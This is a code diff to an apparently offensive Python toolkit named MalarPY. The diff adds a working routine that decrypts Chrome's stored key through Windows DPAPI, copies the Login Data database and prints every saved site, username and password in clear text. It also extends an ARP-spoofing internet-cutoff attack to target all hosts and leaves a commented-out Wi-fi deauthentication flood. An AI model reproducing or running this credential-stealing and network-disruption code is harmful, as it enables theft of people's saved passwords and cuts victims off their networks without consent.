@@ -3,7 +3,7 @@ import pkg_resources
 import sys
 import subprocess
 
-required = {"scapy", "pyfiglet", "python-nmap", "netifaces", "requests", "python-whois", "pick", "phonenumbers"}
+required = {"scapy", "pycryptodome", "pypiwin32", "pyfiglet", "python-nmap", "netifaces", "requests", "python-whois", "pick", "phonenumbers"}
 installed = {pkg.key for pkg in pkg_resources.working_set}
 missing = required - installed
 
@@ -19,6 +19,8 @@ if missing:
 
 from scapy import interfaces
 import scapy.all as scapy
+from scapy.layers.dot11 import Dot11
+
 from pick import pick # Pick is used to create interactive menus
 import time
 import ipaddress
@@ -36,6 +38,14 @@ import whois
 import re
 from collections import namedtuple
 import configparser
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
+
 
 import phonenumbers
 from phonenumbers import geocoder
@@ -64,6 +74,7 @@ options = [
     "Whois Query",
     "Phone Info",
     "Get Wi-fi Passwords",
+    "Get Chrome Passwords",
     "Help",
     "Quit"
 ]
@@ -631,6 +642,8 @@ def internetCutoff():
             except:
                 print("{} - {} ({})".format(i + 1, allMachines[i], "Unable to get hostname"))
 
+        print("{} - All".format(size + 1))
+
         IP2Cut = int(input("Choose the host you wish to cut access to the internet: "))
         targetIP = allMachines[IP2Cut - 1]
 
@@ -657,8 +670,10 @@ def internetCutoff():
                 waitForKeyStroke()
                 return
 
-        # Spoof
-        spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, False)
+
+        #dot11 = Dot11(addr1=MACTarget, addr2=dfGWMAC, addr3=dfGWMAC)
+        #packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)
+        #scapy.sendp(packet, inter=0.1, count=100, iface ="wlan0mon", verbose=1)
 
 
 # Show ARP table
@@ -957,6 +972,112 @@ def getWifiPasswords(verbose):
 
     waitForKeyStroke()
 
+
+
+def getChromeDatetime(chromedate):
+    """Return a `datetime.datetime` object from a chrome format datetime
+    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+
+def getEncryptionKey():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # decode the encryption key from Base64
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # remove DPAPI str
+    key = key[5:]
+    # return decrypted key that was originally encrypted
+    # using a session key derived from current user's logon credentials
+    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+
+def decryptPassword(password, key):
+    try:
+        # get the initialization vector
+        iv = password[3:15]
+        password = password[15:]
+        # generate cipher
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # decrypt password
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
+
+
+
+def getChromePasswords():
+    asciiBanner = pyfiglet.figlet_format("Chrome Passwords")
+    clearTerminal()
+    print(asciiBanner)
+
+    # get the AES key
+    key = getEncryptionKey()
+
+    # local sqlite Chrome database path
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "default", "Login Data")
+    
+    # copy the file to another location
+    # as the database will be locked if chrome is currently running
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+    
+    # connect to the database
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    
+    # `logins` table has the data we need
+    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    
+    # iterate over all rows
+    for row in cursor.fetchall():
+        
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decryptPassword(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]  
+
+        if username or password:
+            print(f"Origin URL: {origin_url}")
+            print(f"Action URL: {action_url}")
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+        else:
+            continue
+
+        if date_created != 86400000000 and date_created:
+            print(f"Creation date: {str(getChromeDatetime(date_created))}")
+        if date_last_used != 86400000000 and date_last_used:
+            print(f"Last Used: {str(getChromeDatetime(date_last_used))}")
+        print("="*50)
+
+    cursor.close()
+    db.close()
+
+    try:
+        # try to remove the copied db file
+        os.remove(filename)
+    except:
+        pass
+
+    waitForKeyStroke()
+
+
+
 # Display main menu
 def menu():
     asciiBanner = pyfiglet.figlet_format("MalarPY")
@@ -1034,6 +1155,9 @@ def main(argv):
 
             if option == "Get Wi-fi Passwords":
                 getWifiPasswords(True)
+            
+            if option == "Get Chrome Passwords":
+                getChromePasswords()
 
             if option == "Help":
                 help()
